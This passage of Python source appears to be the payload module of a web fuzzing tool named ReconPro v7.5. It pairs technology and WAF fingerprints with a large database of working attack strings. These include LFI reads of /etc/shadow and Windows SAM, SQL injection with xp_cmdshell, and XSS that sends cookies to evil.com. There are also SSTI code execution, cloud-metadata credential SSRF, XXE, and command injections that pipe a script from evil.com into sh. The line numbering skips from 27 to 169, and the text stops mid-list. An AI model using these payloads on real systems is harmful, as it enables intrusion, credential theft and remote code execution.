     1→"""
     2→ReconPro v7.5 — Context-Aware Payload Fuzzing Engine
     3→=====================================================
     4→Selects intelligent payloads based on the target's detected technology stack
     5→instead of blindly testing all payloads against every parameter.
     6→
     7→Zero external dependencies — uses only stdlib (urllib, re, dataclasses, etc.).
     8→"""
     9→
    10→from __future__ import annotations
    11→
    12→import re
    13→import time
    14→import json
    15→import urllib.parse
    16→import urllib.request
    17→import urllib.error
    18→from dataclasses import dataclass, field
    19→from typing import Optional
    20→
    21→
    22→# ──────────────────────────────────────────────────────────────────────────────
    23→# TECH_SIGNATURES — Clues for fingerprinting the target technology stack
    24→# ──────────────────────────────────────────────────────────────────────────────
    25→
    26→TECH_SIGNATURES: dict[str, dict[str, str | list[str]]] = {
    27→    "headers": {
   169→        "bootstrap.min.js": "Bootstrap",
   170→        "svelte": "Svelte",
   171→        "next/dist": "Next.js",
   172→        "_next/static": "Next.js",
   173→        "alpine": "Alpine.js",
   174→        "htmx": "htmx",
   175→        "axios": "Axios",
   176→        "d3.min.js": "D3.js",
   177→        "three": "Three.js",
   178→        "moment.min.js": "Moment.js",
   179→    },
   180→    "file_extensions": {
   181→        ".php": "PHP",
   182→        ".asp": "ASP",
   183→        ".aspx": "ASP.NET",
   184→        ".jsp": "Java",
   185→        ".do": "Java (Struts)",
   186→        ".action": "Java (Struts)",
   187→        ".py": "Python",
   188→        ".rb": "Ruby",
   189→        ".go": "Go",
   190→        ".rs": "Rust",
   191→        ".pl": "Perl",
   192→        ".cgi": "CGI",
   193→        ".cfm": "ColdFusion",
   194→        ".dll": "IIS",
   195→    },
   196→    "waf_signatures": {
   197→        "X-WAF-Event": "WAF",
   198→        "X-Sucuri-ID": "Sucuri WAF",
   199→        "X-CDN": "Imperva Cloud WAF",
   200→        "X-Veracode-HASH": "Veracode WAF",
   201→        "CF-RAY": "Cloudflare WAF",
   202→        "__cfduid": "Cloudflare WAF",
   203→        "X-Akamai-GS": "Akamai WAF",
   204→        "X-DefendID": "DefendID WAF",
   205→        "X-Iinfo": "F5 BIG-IP ASM",
   206→        "X-Applereason": "Apple WAF",
   207→        "NSC": "NetScaler WAF",
   208→        "CitrixNS_ID": "Citrix WAF",
   209→        "X-WAF-Block": "Generic WAF",
   210→        "X-Frame-Options": "Security Headers Present",
   211→    },
   212→}
   213→
   214→
   215→# ──────────────────────────────────────────────────────────────────────────────
   216→# LFI / RFI Payload Sets — Flat lists for Local & Remote File Inclusion
   217→# ──────────────────────────────────────────────────────────────────────────────
   218→
   219→_LFI_PAYLOADS: list[str] = [
   220→    # Basic LFI
   221→    "../../../../../../../../etc/passwd",
   222→    "../../../../../../../../etc/shadow",
   223→    "../../../../../../../../etc/hosts",
   224→    "../../../../../../../../etc/group",
   225→    "../../../../../../../../etc/hostname",
   226→    "../../../../../../../../etc/resolv.conf",
   227→    "../../../../../../../../etc/issue",
   228→    "../../../../../../../../etc/motd",
   229→    "../../../../../../../../etc/crontab",
   230→    "../../../../../../../../etc/environment",
   231→    # Linux-specific
   232→    "../../../../../../../../proc/self/environ",
   233→    "../../../../../../../../proc/self/cmdline",
   234→    "../../../../../../../../proc/self/status",
   235→    "../../../../../../../../proc/version",
   236→    "../../../../../../../../proc/mounts",
   237→    "../../../../../../../../var/log/auth.log",
   238→    "../../../../../../../../var/log/syslog",
   239→    "../../../../../../../../var/log/apache2/access.log",
   240→    "../../../../../../../../var/log/nginx/access.log",
   241→    # Windows-specific
   242→    "../../../../../../../../windows/system32/drivers/etc/hosts",
   243→    "../../../../../../../../windows/win.ini",
   244→    "../../../../../../../../windows/system32/config/sam",
   245→    "../../../../../../../../windows/repair/sam",
   246→    "../../../../../../../../windows/debug/NetSetup.log",
   247→    "../../../../../../../../windows/ntds/ntds.dit",
   248→    # Encoded variants
   249→    "..%2f..%2f..%2f..%2fetc%2fpasswd",
   250→    "..%252f..%252f..%252f..%252fetc%252fpasswd",
   251→    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
   252→    "..%c0%af..%c0%af..%c0%af..%c0%afetc%2fpasswd",
   253→    # NULL byte
   254→    "../../../../../../../../etc/passwd%00",
   255→    "../../../../../../../../etc/passwd%00.jpg",
   256→    # PHP wrappers
   257→    "php://filter/convert.base64-encode/resource=index",
   258→    "php://filter/convert.base64-encode/resource=/etc/passwd",
   259→    "php://input",
   260→    "data://text/plain;base64,",
   261→    "expect://id",
   262→    "phar://",
   263→    # Double encoding
   264→    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
   265→    # UTF-8 overlong
   266→    "..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd",
   267→    # Path truncation (Windows)
   268→    "../../../../../../../../etc/passwd...............",
   269→    "../../../../../../../../etc/passwd/././././././.",
   270→]
   271→
   272→_RFI_PAYLOADS: list[str] = [
   273→    "http://example.com/shell.txt",
   274→    "https://raw.githubusercontent.com/test/payload/main/shell.txt",
   275→    "ftp://example.com/payload.txt",
   276→    "php://input",
   277→    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
   278→    "expect://id",
   279→    "php://filter/convert.base64-encode/resource=http://example.com/shell.php",
   280→]
   281→
   282→
   283→# ──────────────────────────────────────────────────────────────────────────────
   284→# PAYLOAD_DATABASE — Real pentesting payloads organized by category & framework
   285→# ──────────────────────────────────────────────────────────────────────────────
   286→
   287→PAYLOAD_DATABASE: dict[str, dict[str, list[str]]] = {
   288→
   289→    # ── SQL Injection ──────────────────────────────────────────────────────
   290→    "sqli": {
   291→        "mysql": [
   292→            "' OR '1'='1",
   293→            "1' OR '1'='1' -- ",
   294→            "' OR 1=1 -- ",
   295→            "' UNION SELECT NULL, username, password FROM users-- ",
   296→            "' UNION SELECT 1, table_name FROM information_schema.tables-- ",
   297→            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
   298→            "' AND BENCHMARK(5000000,SHA1('test'))-- ",
   299→            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- ",
   300→            "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- ",
   301→            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
   302→        ],
   303→        "postgres": [
   304→            "' OR '1'='1",
   305→            "1' OR '1'='1'--",
   306→            "' UNION SELECT NULL, table_name FROM information_schema.tables--",
   307→            "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
   308→            "1; SELECT pg_sleep(5)--",
   309→            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
   310→            "'::int; SELECT 1--",
   311→            "' UNION SELECT NULL, current_database()--",
   312→            "' UNION SELECT NULL, version()--",
   313→            "' UNION SELECT NULL, current_user--",
   314→            "' AND 1=CAST((SELECT version()) AS INT)--",
   315→        ],
   316→        "mssql": [
   317→            "' OR '1'='1",
   318→            "1' OR '1'='1'--",
   319→            "' UNION SELECT NULL, name FROM sysobjects WHERE xtype='U'--",
   320→            "' UNION SELECT NULL, name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--",
   321→            "1; WAITFOR DELAY '0:0:5'--",
   322→            "'; EXEC master..xp_cmdshell('nslookup attacker.com')--",
   323→            "' UNION SELECT NULL, @@version--",
   324→            "' UNION SELECT NULL, DB_NAME()--",
   325→            "' UNION SELECT NULL, SYSTEM_USER--",
   326→            "' AND 1=CONVERT(INT,(SELECT @@version))--",
   327→        ],
   328→        "sqlite": [
   329→            "' OR '1'='1",
   330→            "1' OR '1'='1'--",
   331→            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
   332→            "' UNION SELECT sql FROM sqlite_master--",
   333→            "' UNION SELECT 1, sqlite_version()--",
   334→            "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--",
   335→            "1' AND load_extension('libc')--",
   336→            "' UNION SELECT NULL, tbl_name FROM sqlite_master WHERE type='table'--",
   337→            "1' UNION SELECT hex(zeroblob(8192))--",
   338→            "' AND (SELECT count(*) FROM sqlite_master WHERE type='table')>0--",
   339→        ],
   340→        "oracle": [
   341→            "' OR '1'='1",
   342→            "' UNION SELECT NULL, table_name FROM all_tables--",
   343→            "' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS'--",
   344→            "' UNION SELECT NULL, banner FROM v$version--",
   345→            "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5)='a'--",
   346→            "' UNION SELECT NULL, SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual--",
   347→            "' UNION SELECT NULL, user FROM dual--",
   348→            "' AND (SELECT UTL_INADDR.get_host_address FROM dual) IS NOT NULL--",
   349→            "' UNION SELECT NULL, ORA_DATABASE_NAME FROM dual--",
   350→            "' OR 1=1||CHR(59)--",
   351→        ],
   352→        "generic": [
   353→            "' OR '1'='1",
   354→            "1 OR 1=1",
   355→            "' OR 1=1--",
   356→            "' OR '1'='1'/*",
   357→            "1' OR '1'='1' -- -",
   358→            "' UNION SELECT NULL,NULL,NULL--",
   359→            "' UNION SELECT NULL,username,password FROM users--",
   360→            "1; DROP TABLE users--",
   361→            "' AND 1=1--",
   362→            "' AND 1=2--",
   363→            "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
   364→            "' OR ''='",
   365→            "admin'--",
   366→            "1' ORDER BY 1--",
   367→            "1' ORDER BY 9999--",
   368→            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
   369→            "1' GROUP BY 1--",
   370→            "' AND SUBSTRING(username,1,1)='a'--",
   371→            "1' AND 1=1 UNION SELECT NULL, @@version--",
   372→            "'; EXEC xp_cmdshell('whoami')--",
   373→            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
   374→        ],
   375→    },
   376→
   377→    # ── Cross-Site Scripting (XSS) ─────────────────────────────────────────
   378→    "xss": {
   379→        "html": [
   380→            "<script>alert('XSS')</script>",
   381→            "<img src=x onerror=alert(1)>",
   382→            "<svg onload=alert(1)>",
   383→            "<body onload=alert(1)>",
   384→            "<iframe src=javascript:alert(1)>",
   385→            "<marquee onstart=alert(1)>",
   386→            "<details open ontoggle=alert(1)>",
   387→            '<a href="javascript:alert(1)">click</a>',
   388→            '<input onfocus=alert(1) autofocus>',
   389→            '<div style="background:url(javascript:alert(1))">',
   390→        ],
   391→        "angular": [
   392→            "{{7*7}}",
   393→            "{{constructor.constructor('return alert()')()}}",
   394→            "{{$eval.constructor('return alert()')()}}",
   395→            "{{x='constructor';y=x;alert(y)}}",
   396→            "{{''.constructor.constructor('alert(1)')()}}",
   397→            "{{toString.constructor('return alert()')()}}",
   398→            "{{$on.constructor('alert(1)')()}}",
   399→            "{{[].constructor.constructor('alert(1)')()}}",
   400→            "{{0.constructor.constructor('alert(1)')()}}",
   401→            "{{a=toString;b=a.constructor;b('alert(1)')()}}",
   402→        ],
   403→        "react": [
   404→            "{{}}",
   405→            '{"__proto__":{"isAdmin":1}}',
   406→            '{"constructor":{"prototype":{"isAdmin":true}}}',
   407→            '<script src="https://evil.com/1.js"></script>',
   408→            'javascript:alert(1)',
   409→            '<img src=x onerror="window.location=\'https://evil.com/?c=\'+document.cookie">',
   410→            '<a href="https://evil.com" target="_blank" rel="opener">click</a>',
   411→            '"><img src=x onerror=alert(document.domain)>',
   412→            "'-alert(1)-'",
   413→            "<script>document.body.innerHTML=''</script>",
   414→        ],
   415→        "vue": [
   416→            "{{7*7}}",
   417→            "{{this.constructor.constructor('return this')().alert(1)}}",
   418→            "{{constructor.constructor('return alert(1)')()}}",
   419→            "${7*7}",
   420→            "{{_c.constructor('alert(1)')()}}",
   421→            "{{[].pop.constructor('alert(1)')()}}",
   422→            "{{'a'.constructor.constructor('alert(1)')()}}",
   423→            "{{$data.constructor.constructor('alert(1)')()}}",
   424→            "{{typeof this}}",
   425→            "{{[this][0].constructor.constructor('alert(1)')()}}",
   426→        ],
   427→        "generic": [
   428→            "<script>alert(String.fromCharCode(88,83,83))</script>",
   429→            "<img src=1 onerror=alert(1)>",
   430→            "<svg/onload=alert(1)>",
   431→            "'';!--\"<xss>=&{()}",
   432→            "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
   433→            "<div data-x=\"\"><img src=x onerror=alert(1)//\"></div>",
   434→            "javascript:void(0)//\"",
   435→            "'-alert(1)-'",
   436→            "<img src=x:alert(alt) onerror=eval(src)>",
   437→            "prompt(1)",
   438→        ],
   439→    },
   440→
   441→    # ── Server-Side Template Injection (SSTI) ──────────────────────────────
   442→    "ssti": {
   443→        "jinja2": [
   444→            "{{7*7}}",
   445→            "{{config}}",
   446→            "{{self.__init__.__globals__}}",
   447→            "{{''.__class__.__mro__[1].__subclasses__()}}",
   448→            "{{''.__class__.__mro__[2].__subclasses__()}}",
   449→            "{{cycler.__init__.__globals__.os}}",
   450→            "{{lipsum.__globals__['os'].popen('id').read()}}",
   451→            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
   452→        ],
   453→        "django": [
   454→            "{% debug %}",
   455→            "{{request}}",
   456→            "{% load debug %}",
   457→            "{% debug context %}",
   458→            "{{settings.SECRET_KEY}}",
   459→            "{{settings.DATABASES}}",
   460→            "{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
   461→            "{{user}}",
   462→        ],
   463→        "mako": [
   464→            "${7*7}",
   465→            "${self._modules[context]}}",
   466→            "<%import os%>${os.popen('id').read()}",
   467→            "${__import__('os').popen('id').read()}",
   468→            "<%=7*7%>",
   469→            "${self.__init__.__globals__['os'].popen('id').read()}",
   470→            "${request.environ}",
   471→            "${self.template.module.__builtins__.__import__('os').popen('id').read()}",
   472→        ],
   473→        "twig": [
   474→            "{{7*7}}",
   475→            "{{_self}}",
   476→            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
   477→            "{{['id']|filter('system')}}",
   478→            "{{dump(app)}}",
   479→            "{{app.request.server.all|join(',')}}",
   480→            "{%for x in _context%}{{x}}{%endfor%}",
   481→            "{{_context|json_encode}}",
   482→        ],
   483→        "generic": [
   484→            "{{7*7}}",
   485→            "${7*7}",
   486→            "#{7*7}",
   487→            "<%=7*7%>",
   488→            "${{7*7}}",
   489→            "#{% debug %}",
   490→            "${{config}}",
   491→            "{{7*'7'}}",
   492→            "{{'{{'}}",
   493→            "{{config.items()}}",
   494→        ],
   495→    },
   496→
   497→    # ── Server-Side Request Forgery (SSRF) ─────────────────────────────────
   498→    "ssrf": {
   499→        "aws_metadata": [
   500→            "http://169.254.169.254/latest/meta-data/",
   501→            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
   502→            "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
   503→            "http://169.254.169.254/latest/user-data/",
   504→            "http://169.254.169.254/latest/meta-data/hostname",
   505→            "http://169.254.169.254/latest/meta-data/local-ipv4",
   506→            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
   507→            "http://169.254.169.254/latest/dynamic/instance-identity/document",
   508→        ],
   509→        "gcp_metadata": [
   510→            "http://metadata.google.internal/computeMetadata/v1/",
   511→            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
   512→            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
   513→            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
   514→            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
   515→            "http://169.254.169.254/computeMetadata/v1/",
   516→            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
   517→            "http://metadata.google.internal/computeMetadata/v1/os-login/users",
   518→        ],
   519→        "azure_metadata": [
   520→            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
   521→            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
   522→            "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01",
   523→            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
   524→            "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01",
   525→            "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01",
   526→            "http://169.254.169.254/metadata/instance/compute/plan?api-version=2021-02-01",
   527→            "http://169.254.169.254/metadata/instance/identity?api-version=2021-02-01",
   528→        ],
   529→        "generic": [
   530→            "http://127.0.0.1/",
   531→            "http://localhost/",
   532→            "http://[::1]/",
   533→            "http://0.0.0.0/",
   534→            "http://127.0.0.1:80/",
   535→            "http://localhost:8080/",
   536→            "http://2130706433/",
   537→            "http://0x7f000001/",
   538→            "http://127.1/",
   539→            "http://127.0.0.1./",
   540→            "http://0177.0.0.1/",
   541→            "http://10.0.0.1/",
   542→            "http://192.168.1.1/",
   543→            "http://172.16.0.1/",
   544→            "http://169.254.169.254/",
   545→            "http://metadata/",
   546→        ],
   547→    },
   548→
   549→    # ── Path Traversal ─────────────────────────────────────────────────────
   550→    "path_traversal": {
   551→        "unix": [
   552→            "../../../etc/passwd",
   553→            "..%2f..%2f..%2fetc%2fpasswd",
   554→            "....//....//....//etc/passwd",
   555→            "/etc/passwd",
   556→            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
   557→            "..../..../..../etc/passwd",
   558→            "/..../..../..../etc/passwd",
   559→            "../../../etc/shadow",
   560→        ],
   561→        "windows": [
   562→            "..\\..\\..\\windows\\system32\\config\\sam",
   563→            "..%5c..%5c..%5cwindows%5cwin.ini",
   564→            "....\\....\\....\\windows\\win.ini",
   565→            "C:\\windows\\system32\\config\\sam",
   566→            "..\\..\\..\\..\\boot.ini",
   567→            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
   568→            "..\\..\\..\\..\\windows\\repair\\sam",
   569→            "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
   570→        ],
   571→        "generic": [
   572→            "../",
   573→            "../../",
   574→            "../../../",
   575→            "..%2f",
   576→            "%2e%2e/",
   577→            "..%00/",
   578→            "..%252f",
   579→            "..%c0%af",
   580→            "..%ef%bc%8f",
   581→            "..\\",
   582→            "..././..././..././",
   583→            "/.",
   584→            "//",
   585→            "..;/",
   586→            "..%0d%0a/",
   587→            "..\\%0d%0a/",
   588→        ],
   589→    },
   590→
   591→    # ── Command Injection ────────────────────────────────────────────────────
   592→    "command_injection": {
   593→        "unix": [
   594→            "; id",
   595→            "| id",
   596→            "$(id)",
   597→            "`id`",
   598→            "&& id",
   599→            "|| id",
   600→            "\nid",
   601→            "|| whoami",
   602→            "; cat /etc/passwd",
   603→            "| cat /etc/passwd",
   604→            "$(cat /etc/passwd)",
   605→            "`cat /etc/passwd`",
   606→            "; ls -la /",
   607→            "| ping -c 4 127.0.0.1",
   608→            "$(sleep 5)",
   609→            "; curl https://evil.com/shell.sh|sh",
   610→        ],
   611→        "windows": [
   612→            "& whoami",
   613→            "| whoami",
   614→            "%0a whoami",
   615→            "^whoami",
   616→            "&& whoami",
   617→            "|| whoami",
   618→            "& dir C:\\",
   619→            "| dir C:\\",
   620→            "%0d%0a dir C:\\",
   621→            "& net user",
   622→            "& ipconfig /all",
   623→            "& tasklist",
   624→            "& systeminfo",
   625→            "& ping -n 4 127.0.0.1",
   626→            "certutil -urlcache -split -f https://evil.com/payload.exe",
   627→        ],
   628→        "generic": [
   629→            ";",
   630→            "|",
   631→            "&",
   632→            "&&",
   633→            "||",
   634→            "$(",
   635→            "`",
   636→            "\n",
   637→            "\r\n",
   638→            "%0a",
   639→            "%0d%0a",
   640→            "|",
   641→            ";",
   642→            "&",
   643→            "$(sleep 5)&",
   644→            "' sleep 5 '",
   645→        ],
   646→    },
   647→
   648→    # ── LDAP Injection ──────────────────────────────────────────────────────
   649→    "ldap_injection": {
   650→        "generic": [
   651→            "*()(&)",
   652→            "*()|(&",
   653→            "*)(uid=*))(|(uid=*",
   654→            "admin*",
   655→            "admin*)((|(uid=*",
   656→            "*)(uid=*))",
   657→            "*()%",
   658→            "*%00",
   659→            "*)(|(objectclass=*))",
   660→            "(|(cn=*)(objectclass=user))",
   661→            "*)(objectClass=user))(",
   662→            "*)(objectClass=*))(",
   663→            "*)(uid=*",
   664→            "*)(&",
   665→            ")(cn=*)(objectClass=user))",
   666→            "*)(cn=*))%00",
   667→        ],
   668→    },
   669→
   670→    # ── XML External Entity (XXE) ────────────────────────────────────────────
   671→    "xxe": {
   672→        "generic": [
   673→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
   674→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
   675→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
   676→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
   677→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
   678→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
   679→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
   680→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>test</foo>',
   681→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/_SMTP%20INJECTION">]><foo>&xxe;</foo>',
   682→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
   683→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
